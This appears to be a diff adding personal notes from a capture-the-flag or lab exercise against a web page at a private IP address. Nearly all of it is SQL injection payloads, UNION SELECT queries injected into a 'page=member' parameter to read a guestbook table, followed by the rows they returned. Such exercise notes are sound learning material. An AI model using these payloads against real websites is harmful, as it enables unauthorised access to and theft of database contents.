@@ -1,0 +1,7 @@
+http://192.168.1.16/?page=member
+9 UNION SELECT id_comment, comment FROM Member_guestbook.guestbook
+	UNION SELECT id_comment, name FROM Member_guestbook.guestbook--
+ 
+id: 1
+comment : This is the best site EVER
+name : wil
